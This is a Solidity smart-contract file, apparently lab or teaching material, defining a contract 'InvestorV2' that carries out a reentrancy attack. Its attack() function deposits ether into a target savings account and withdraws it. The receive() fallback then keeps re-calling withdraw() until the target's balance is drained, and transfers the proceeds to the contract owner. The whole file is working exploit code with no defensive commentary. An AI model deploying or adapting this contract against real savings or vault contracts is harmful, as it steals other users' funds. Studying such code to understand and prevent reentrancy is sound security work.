// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.9;

import "@openzeppelin/contracts/access/Ownable.sol";

interface ISavingsAccount {
    function deposit() external payable;
    function withdraw() external;
}

contract InvestorV2 is Ownable {
    // this immutable is read-only, but assignable in the constructor
    ISavingsAccount public immutable savingsAccount;

    constructor(address savingsAccountAddress) {
        savingsAccount = ISavingsAccount(savingsAccountAddress);
    }

    function attack() external payable {
        savingsAccount.deposit{value: msg.value}();
        savingsAccount.withdraw();  
    }

    receive() external payable {
        if(address(savingsAccount).balance > 0) {
            savingsAccount.withdraw();
        } else {
            payable(owner()).transfer(address(this).balance);
        }
    }
}